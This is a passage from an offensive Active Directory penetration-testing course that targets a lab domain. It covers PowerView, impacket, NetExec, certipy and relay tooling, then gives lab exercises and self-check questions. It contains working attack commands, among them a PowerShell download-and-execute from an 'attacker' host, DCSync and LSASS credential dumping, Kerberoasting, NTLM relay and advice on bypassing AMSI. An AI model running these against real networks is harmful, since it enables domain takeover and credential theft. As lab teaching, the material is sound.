  No "transaction" — back up the attribute before changing if you'll
  need to restore.

---

## 7.15 PowerView (PowerShell) and ldeep / ldapdomaindump

PowerView is the PowerShell AD enumeration toolkit. Drop and import:

```powershell
PS> IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
PS> Get-DomainUser -SPN
PS> Get-DomainObject -Identity peter.parker -Properties memberof,description
PS> Find-InterestingDomainAcl -ResolveGUIDs
PS> Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity peter.parker \
        -Rights All
PS> Get-DomainGPOLocalGroup
PS> Invoke-EnumerateLocalAdmin -ComputerName ws01.corp.local
```

`ldeep` and `ldapdomaindump` are Linux equivalents:

```bash
ldeep ldap -u peter.parker -p '...' -d corp.local -s ldap://dc01.corp.local \
        all -o loot/ldeep

ldapdomaindump -u 'CORP\peter.parker' -p 'DVADlab2024!' dc01.corp.local -o loot/ldd
# Output: HTML + JSON + GRP/SID files. Open in browser.
```

### Tips that save hours

- **PowerView lives on the victim.** It's PowerShell, so AMSI and CLM
  can interfere. Use a clean reflection-bypassed runspace if needed.
- **`-ResolveGUIDs`** in `Find-InterestingDomainAcl` is essential —
  otherwise you stare at extended right GUIDs you don't recognise.
- **ldeep `all`** generates 30+ JSON files. Useful for offline grep.
- **ldapdomaindump HTML** is the cleanest at-a-glance ACL view.

---

## 7.16 Miscellaneous

- **`enum4linux-ng`** — quick SMB null/auth enumeration. First thing to
  run against an unknown host.
- **`smbmap`** — enumerate accessible shares quickly:
  `smbmap -u peter.parker -p '...' -d corp.local -H 10.10.0.13 -R`.
- **`smbclient`** — interactive SMB:
  `smbclient //file01/share -U corp.local/peter.parker%'DVADlab2024!'`.
- **`gMSADumper.py`** — read msDS-ManagedPassword from gMSA accounts you
  can read.
- **`addcomputer.py`** — create machine accounts via SAMR or LDAPS
  (impacket's wrapper).
- **`zerologon-tester.py`** / `mimikatz zerologon` / `nxc -M zerologon`
  — CVE-2020-1472.
- **`Coercer`** — multi-protocol coercion tester (PetitPotam + Printer +
  DFS + 5 others).
- **`netcat`/`socat`** — port-forward / pivot.
- **`chisel`** / `ligolo-ng` / `sshuttle` — pivoting through compromised
  hosts to reach inner networks (relevant for VPS topology where you
  tunnel through the bridge).
- **`hashid`** — guess hash type by format. Useful when somebody hands
  you a hash with no context.
- **`secretsdump.py LOCAL`** — offline mode on SAM/SYSTEM/NTDS files.
- **`pwndoc`/`SysReptor`** — report generation; only needed for
  engagements, but worth knowing.
- **`dnschef`** — DNS spoofer for non-Windows targets.
- **`John the Ripper`** — alternative cracker with great hash-format
  identification.
- **`onesixtyone`** — SNMP brute (out of scope for AD but useful in
  perimeter recon).
- **`kerbrute`** — Kerberos username enum / password spray. Faster than
  impacket-GetADUsers for spray.

---

## 7.17 The opsec frame

A few tooling-agnostic habits:

1. **Use the same Kerberos ccache for everything.** Set
   `KRB5CCNAME=/tmp/peter.parker.ccache`; chain getTGT → getST → psexec without
   retyping passwords.
2. **Tee everything.** `2>&1 | tee logs/$(date +%Y%m%d-%H%M%S)-$tool.log`.
   You'll want the audit trail later.
3. **Always specify `-dc-ip` and `-target-ip`** to bypass DNS surprises.
4. **Run `sudo ntpdate 10.10.0.10`** before any Kerberos work.
5. **Keep a one-page note** of each user, their hash, their groups.
   BloodHound is the visual; the note is the truth.
6. **Clean up.** Removed Shadow Credentials, deleted forged tickets,
   purged the krb5cc. Real engagements expect you to leave no
   non-essential artefacts.
7. **One terminal per role**: one for the attacker shell, one for the
   long-running listener (Responder/ntlmrelayx), one for ad-hoc tools.
   `tmux` makes this scale.
8. **Always know who you are.** Before every command, ask: "what identity
   am I about to authenticate as, and to what target?" Misfiring a DA
   credential against the wrong host triggers logs you didn't need.

---

## 7.18 Decision tree — which tool when

You found a low-priv credential. What next?

```
have creds?
  yes -> nxc smb 10.10.0.0/21 -u user -p pass   (sweep)
         -> any wins?  yes  -> evil-winrm or psexec
                       no  -> bloodhound-python; review ACL paths
have hash, not password?
  -> nxc smb ... -H NT
  -> impacket-secretsdump if local admin anywhere
have a TGT?
  -> KRB5CCNAME set; impacket -k -no-pass for everything
need to escalate via ADCS?
  -> certipy find -vulnerable
need to escalate via ACL?
  -> bloodhound; then bloodyAD for the write
need to coerce?
  -> Coercer (auto), then PetitPotam / DFSCoerce / SpoolSample
need to relay?
  -> ntlmrelayx with -socks
need a ticket forge?
  -> impacket-ticketer (offline) or Rubeus (Windows-side)
need to crack?
  -> hashcat -m <mode>; choose mode from §7.13
```

After the first escalation, the same tree applies recursively: every new
identity is "low-priv" relative to the next step.

---

## Lab exercises

### Exercise 7.A — Configure your workstation

Install the toolset above. Verify each runs (`-h` on every binary). Set
up a local web server for hosting binaries to victims:

```bash
cd ~/winbins && python3 -m http.server 8000 -b 10.10.0.1
```

Test a download from a Windows victim:

```
PS> IEX (New-Object Net.WebClient).DownloadString('http://10.10.0.1:8000/PowerView.ps1')
PS> Get-DomainUser -Identity peter.parker
```

### Exercise 7.B — Set the time

```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.10.0.10
date    # should match the DC's date
```

Confirm with `klist`-able TGT:

```bash
impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
```

### Exercise 7.C — Drop a Kerberos ccache and reuse it

```bash
impacket-getTGT corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
mv peter.parker.ccache /tmp/peter.parker.ccache
export KRB5CCNAME=/tmp/peter.parker.ccache
klist     # should show peter.parker's TGT
impacket-secretsdump -k -no-pass -dc-ip 10.10.0.10 \
        corp.local/peter.parker@dc01.corp.local
```

### Exercise 7.D — Run BloodHound

```bash
bloodhound-python -d corp.local -u peter.parker -p 'DVADlab2024!' \
        -ns 10.10.0.10 -c All --zip
neo4j start
bloodhound &
# Drag-drop the zip into the GUI, run "Shortest paths to Domain Admins"
```

Mark peter.parker as owned. Inspect the path. Annotate each edge in your notes.

### Exercise 7.E — NetExec sweep

```bash
nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
nxc winrm 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!'
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --kerberoasting kerb.hash
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --asreproast asrep.hash
nxc smb 10.10.0.0/21 -u peter.parker -p 'DVADlab2024!' -M lsassy
```

Save the outputs to `notes/recon/`.

### Exercise 7.F — certipy find vs Certify.exe

Run `certipy find` from Linux and `Certify.exe find` from Windows.
Compare outputs. Note that Certify is Windows-only and uses the local
machine's auth context.

### Exercise 7.G — ntlmrelayx + Responder chain

Start Responder with SMB/HTTP off, ntlmrelayx with -tf targets.txt. From
a victim, trigger an SMB hit (browse `\\fakehost\share`). Observe the
relayed connection.

### Exercise 7.H — Convert formats

Practice format conversions:

```bash
impacket-ticketConverter peter.parker.ccache peter.parker.kirbi
impacket-ticketConverter peter.parker.kirbi peter.parker.ccache

openssl pkcs12 -in administrator.pfx -nocerts -nodes -out admin.key
openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt

certipy cert -pfx administrator.pfx -nocert -export
```

### Exercise 7.I — Build your loot directory

After your first session, organise:

```
loot/
├── creds.txt           # one line per user: USER:DOMAIN:LM:NT:plaintext
├── tickets/            # ccache files, named by principal
├── certs/              # .pfx files, named by principal
├── ntds/               # ntds.dit dumps
└── shares/             # interesting files from share scrapes
```

Maintain this throughout the lab.

---

## Self-check questions

1. Which impacket script DCSyncs the krbtgt account?
2. What's the difference between `psexec.py`, `wmiexec.py`, and
   `smbexec.py` operationally?
3. How does `-k -no-pass` change impacket's behavior?
4. What does mitm6 spoof, and why does that work against Windows?
5. What's the difference between Responder's listener mode and
   ntlmrelayx's relay mode?
6. Which of PetitPotam, SpoolSample, DFSCoerce uses MS-EFSR?
7. What hashcat modes do you need for: NTLM, NetNTLMv2, Kerberoast RC4,
   AS-REP RC4, Kerberoast AES256?
8. What does `bloodhound-python -c All` collect?
9. Why does `KRB5CCNAME` matter for chained impacket commands?
10. When would you use bloodyAD over impacket-rbcd?
11. What's the difference between `certipy find` and `Certify.exe find`?
12. What does `nxc -M lsassy` do under the hood?
13. Why does `--no-http-server` matter for ntlmrelayx?
14. What does Rubeus's `/tgtdeleg` flag enable?
15. When do you reach for `pypykatz` instead of mimikatz?
16. What is `evil-winrm`'s default port and protocol?
17. What does `mitm6 --no-ra` change?
18. Why is `-smb2support` almost always needed for ntlmrelayx?

---

## References

- **impacket** repo: https://github.com/fortra/impacket
- **certipy** repo + wiki: https://github.com/ly4k/Certipy
- **NetExec** wiki: https://wiki.netexec.wiki/
- **BloodHound** docs: https://bloodhound.readthedocs.io/
- **Pennyw0rth NetExec module reference** — every `-M` module documented.
- **Responder** repo: https://github.com/lgandx/Responder
- **GhostPack** suite (Rubeus, Certify, Seatbelt): https://github.com/GhostPack
- **HackTricks AD wiki**: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
  — pragmatic cookbook.
- **The Hacker Recipes** (exegol.com / thehacker.recipes): tool-centric
  AD playbook.
- **0xdf hacks stuff** — HTB writeups using these tools in context.
- **Adam Chester (xpn)** blog — deep dives on token manipulation,
  LSASS, etc.
- **dirkjanm.io** — mitm6, krbrelayx, ROADtools, PKINIT tooling.

Next: [08-recon-and-enum.md](08-recon-and-enum.md).
